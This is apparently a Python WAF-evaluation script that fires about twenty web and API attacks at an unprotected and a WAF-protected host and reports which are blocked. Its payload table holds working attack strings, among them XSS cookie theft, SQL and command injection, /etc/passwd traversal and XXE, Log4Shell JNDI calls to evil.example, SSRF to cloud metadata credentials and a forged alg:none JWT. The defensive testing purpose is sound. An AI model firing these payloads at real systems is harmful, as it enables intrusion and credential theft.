#!/usr/bin/env python3
"""
Fire a suite of modern web + API attacks at two hosts fronting the SAME origin:
  --open    e.g. https://payments-open.fictionally.org    (no WAF)
  --secure  e.g. https://payments-secure.fictionally.org  (wslproxy WAF, block)

For each attack we report, per host, whether the payload EXPLOITED the origin
(the tell-tale signature came back in the response) or was BLOCKED by the WAF
(HTTP 403 with the X-WAF-Block header). Emits a table and, with --json FILE, a
machine-readable result for the comparison dashboard.

Business-logic attacks (BOLA/IDOR) carry no injectable signature, so a
signature WAF cannot stop them on the payload alone — the suite records that
honestly rather than pretending otherwise.
"""
import argparse
import json
import ssl
import sys
import urllib.request
import urllib.error
from urllib.parse import quote

CTX = ssl.create_default_context()


def encode_path(path):
    """Percent-encode spaces/control chars in the query while preserving URL
    structure and attack characters (so the payload still reaches the origin)."""
    if "?" not in path:
        return quote(path, safe="/")
    p, q = path.split("?", 1)
    return quote(p, safe="/") + "?" + quote(q, safe="=&/:%*()[]{}$!,;@'\"<>|^~-._+")

# name, owasp/cve label, class, method, path, body, signature-that-proves-exploit
ATTACKS = [
    ("Reflected XSS", "OWASP A03", "injection", "GET",
     "/search?q=<script>alert(document.cookie)</script>", None, "<script>alert(document.cookie)</script>"),
    ("SQL injection (UNION)", "OWASP A03", "injection", "GET",
     "/products?cat=x' UNION SELECT * FROM users--", None, "injection succeeded"),
    ("Path traversal", "OWASP A01", "traversal", "GET",
     "/statement?file=../../../../../../../../etc/passwd", None, "root:"),
    ("Encoded traversal (evasion)", "OWASP A01", "traversal", "GET",
     "/statement?file=..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd", None, "root:"),
    ("OS command injection", "OWASP A03", "injection", "GET",
     "/ping?host=127.0.0.1;id", None, "uid=0(root)"),
    ("SSTI — arithmetic", "Beyond Top 10", "ssti", "GET",
     "/render?tpl={{7*7}}", None, ">49<"),
    ("SSTI — secret exfiltration", "Beyond Top 10", "ssti", "GET",
     "/render?tpl={{config}}", None, "sk_live"),
    ("Log4Shell JNDI", "CVE-2021-44228", "rce", "GET",
     "/lookup?user=${jndi:ldap://evil.example/a}", None, "REMOTE CODE EXECUTION"),
    ("Log4Shell obfuscated (evasion)", "CVE-2021-44228", "rce", "GET",
     "/lookup?user=${${lower:j}ndi:ldap://evil.example/a}", None, "REMOTE CODE EXECUTION"),
    ("Spring4Shell", "CVE-2022-22965", "rce", "GET",
     "/bind?class.module.classLoader.URLs%5B0%5D=x", None, "ClassLoader manipulated"),
    ("SSRF → cloud metadata", "Beyond Top 10", "ssrf", "GET",
     "/fetch?url=http://169.254.169.254/latest/meta-data/iam/", None, "AccessKeyId"),
    ("NoSQL injection auth bypass", "API security", "nosqli", "POST",
     "/api/login", '{"user":"admin","pass":{"$ne":null}}', "\"nosql_bypass\": true"),
    ("XXE file disclosure", "API security", "xxe", "POST",
     "/api/import", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
     "leaked_file"),
    ("GraphQL introspection", "API security", "graphql", "POST",
     "/graphql", '{"query":"query IntrospectionQuery {__schema {types {name}}}"}', "introspection enabled"),
    ("Prototype pollution", "API security", "proto", "POST",
     "/api/merge", '{"__proto__":{"admin":true}}', "\"prototype_polluted\": true"),
    ("JWT alg:none forgery", "API security", "jwt", "GET",
     "/api/me", None, "\"forged\": true"),  # header injected below
    ("Mass assignment (privilege)", "API security", "mass-assignment", "POST",
     "/api/profile", '{"user":"me","role":"admin"}', "\"escalated\": true"),
    ("Scanner recon (sqlmap UA)", "Bot defense", "scanner", "GET",
     "/products?cat=deposit", None, "sqlmap-signature"),  # detection via UA, see below
    ("HTTP request smuggling", "CWE-444", "smuggling", "POST",
     "/api/batch",
     '{"batch":"noop"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: acme\r\n\r\n',
     "\"smuggled\": true"),
    ("BOLA / IDOR", "API security", "bola", "GET",
     "/api/accounts/9999", None, "71230411"),
]

# forged alg:none JWT: {"alg":"none"}.{"sub":"admin","role":"admin"}.
import base64
_b = lambda o: base64.urlsafe_b64encode(
    json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
FORGED_JWT = f'{_b({"alg":"none","typ":"JWT"})}.{_b({"sub":"admin","role":"admin"})}.'


def fire(base, method, path, body, extra_headers):
    url = base.rstrip("/") + encode_path(path)
    data = body.encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", extra_headers.get("User-Agent", "attack-suite/1.0"))
    for k, v in extra_headers.items():
        if k != "User-Agent":
            req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=20, context=CTX) as r:
            return r.status, dict(r.headers), r.read(20000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(20000).decode("utf-8", "replace")
    except Exception as e:
        return 0, {}, f"ERROR {e}"


def classify(status, headers, body, signature):
    blocked = status == 403 and any(h.lower() == "x-waf-block" for h in headers)
    exploited = (signature in body) and not blocked
    return blocked, exploited


def run(base):
    out = []
    for (name, label, cls, method, path, body, sig) in ATTACKS:
        headers = {}
        if name.startswith("JWT"):
            headers["Authorization"] = f"Bearer {FORGED_JWT}"
        if name.startswith("Scanner"):
            headers["User-Agent"] = "sqlmap/1.7.11#stable (https://sqlmap.org)"
            sig_check = None  # success = reached origin at all with scanner UA
        status, hdrs, resp = fire(base, method, path, body, headers)
        if name.startswith("Scanner"):
            blocked = status == 403 and any(h.lower() == "x-waf-block" for h in hdrs)
            exploited = not blocked and status == 200
        else:
            blocked, exploited = classify(status, hdrs, resp, sig)
        out.append({"name": name, "label": label, "cls": cls, "method": method,
                    "status": status, "blocked": blocked, "exploited": exploited,
                    "waf_rule": hdrs.get("X-WAF-Rule") or hdrs.get("x-waf-rule", "")})
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--open", required=True)
    ap.add_argument("--secure", required=True)
    ap.add_argument("--json")
    a = ap.parse_args()

    ro = run(a.open)
    rs = run(a.secure)
    rows = []
    for o, s in zip(ro, rs):
        rows.append({**o, "secure_blocked": s["blocked"], "secure_exploited": s["exploited"],
                     "secure_status": s["status"], "secure_rule": s["waf_rule"]})

    w = max(len(r["name"]) for r in rows) + 1
    print(f"\n{'ATTACK'.ljust(w)} {'CLASS'.ljust(16)} {'OPEN (no WAF)'.ljust(16)} {'SECURE (wslproxy WAF)'}")
    print("-" * (w + 55))
    exp_open = blk_secure = 0
    for r in rows:
        openv = "🔴 EXPLOITED" if r["exploited"] else ("— n/a" if r["status"] == 0 else "⚪ no-effect")
        if r["secure_blocked"]:
            sec = "🟢 BLOCKED"
        elif r["secure_exploited"]:
            sec = "🔴 EXPLOITED"
        else:
            sec = "⚪ passed"
        exp_open += r["exploited"]
        blk_secure += r["secure_blocked"]
        print(f"{r['name'].ljust(w)} {r['label'].ljust(16)} {openv.ljust(16)} {sec}")
    print("-" * (w + 55))
    print(f"OPEN: {exp_open}/{len(rows)} attacks exploited the origin")
    print(f"SECURE: {blk_secure}/{len(rows)} attacks blocked by wslproxy WAF\n")

    if a.json:
        with open(a.json, "w") as f:
            json.dump({"open": a.open, "secure": a.secure, "rows": rows,
                       "summary": {"total": len(rows), "exploited_open": exp_open,
                                   "blocked_secure": blk_secure}}, f, indent=2)
        print(f"wrote {a.json}")


if __name__ == "__main__":
    main()
